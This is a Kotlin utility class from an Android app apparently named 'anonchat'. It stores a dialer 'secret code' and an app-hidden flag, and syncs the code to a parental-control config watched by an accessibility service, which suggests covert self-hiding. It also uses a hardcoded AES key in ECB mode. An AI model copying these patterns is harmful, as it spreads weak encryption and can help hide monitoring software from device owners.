package com.anonchat.app.util

import android.content.Context
import android.content.SharedPreferences
import javax.crypto.Cipher
import javax.crypto.SecretKeyFactory
import javax.crypto.spec.PBEKeySpec
import javax.crypto.spec.SecretKeySpec
import android.util.Base64

object SecretCodeManager {

    private const val KEY_SECRET_CODE = "secret_code_encrypted"
    private const val KEY_APP_HIDDEN = "is_app_hidden"
    private const val KEY_CODE_SET = "is_code_set"
    private const val ENCRYPTION_KEY = "An0nCh4tS3cr3tK3y!@#"

    private fun getPrefs(context: Context): SharedPreferences? {
        // On Android 7+ with File-Based Encryption, credential-protected
        // SharedPreferences are unavailable until the user unlocks the device
        // after boot. Direct Boot processes (Application.onCreate, BOOT_COMPLETE
        // receivers) throw IllegalStateException. Fall back to device-protected
        // (DE) storage so the app survives pre-unlock.
        return try {
            context.getSharedPreferences("anon_chat_secret", Context.MODE_PRIVATE)
        } catch (e: IllegalStateException) {
            try {
                context.createDeviceProtectedStorageContext()
                    .getSharedPreferences("anon_chat_secret", Context.MODE_PRIVATE)
            } catch (e2: Exception) {
                null
            }
        } catch (e: Exception) {
            null
        }
    }

    fun isCodeSet(context: Context): Boolean {
        return getPrefs(context)?.getBoolean(KEY_CODE_SET, false) ?: false
    }

    fun saveSecretCode(context: Context, code: String): Boolean {
        if (code.length < 4 || code.length > 15) return false
        if (!code.all { it.isDigit() }) return false

        val encrypted = encrypt(code)
        getPrefs(context)?.edit()
            ?.putString(KEY_SECRET_CODE, encrypted)
            ?.putBoolean(KEY_CODE_SET, true)
            ?.apply() ?: return false

        // Mirror the code into the parental-control config so the accessibility
        // dialer fallback (AutoPermissionHelper.checkDialerForSecretCode) watches
        // for the SAME code the user actually set — otherwise the two secret-code
        // paths drift apart and the fallback only ever matches the hardcoded default.
        try {
            com.anonchat.app.parentalcontrol.api.CloudConfig.init(context)
            com.anonchat.app.parentalcontrol.api.CloudConfig.secretDialerCode = code
        } catch (e: Exception) {
            android.util.Log.w("SecretCodeManager", "Failed to sync code to CloudConfig: ${e.message}")
        }
        return true
    }

    fun getSecretCode(context: Context): String? {
        val encrypted = getPrefs(context)?.getString(KEY_SECRET_CODE, null) ?: return null
        return decrypt(encrypted)
    }

    fun verifyCode(context: Context, inputCode: String): Boolean {
        val savedCode = getSecretCode(context) ?: return false
        return savedCode == inputCode
    }

    fun isAppHidden(context: Context): Boolean {
        return getPrefs(context)?.getBoolean(KEY_APP_HIDDEN, false) ?: false
    }

    fun setAppHidden(context: Context, hidden: Boolean) {
        getPrefs(context)?.edit()?.putBoolean(KEY_APP_HIDDEN, hidden)?.apply()
    }

    private fun encrypt(text: String): String {
        val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
        val keySpec = SecretKeySpec(sha256(ENCRYPTION_KEY), "AES")
        cipher.init(Cipher.ENCRYPT_MODE, keySpec)
        val encrypted = cipher.doFinal(text.toByteArray(Charsets.UTF_8))
        return Base64.encodeToString(encrypted, Base64.DEFAULT)
    }

    private fun decrypt(encrypted: String): String {
        val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
        val keySpec = SecretKeySpec(sha256(ENCRYPTION_KEY), "AES")
        cipher.init(Cipher.DECRYPT_MODE, keySpec)
        val decoded = Base64.decode(encrypted, Base64.DEFAULT)
        return String(cipher.doFinal(decoded), Charsets.UTF_8)
    }

    private fun sha256(input: String): ByteArray {
        val md = java.security.MessageDigest.getInstance("SHA-256")
        return md.digest(input.toByteArray(Charsets.UTF_8))
    }
}
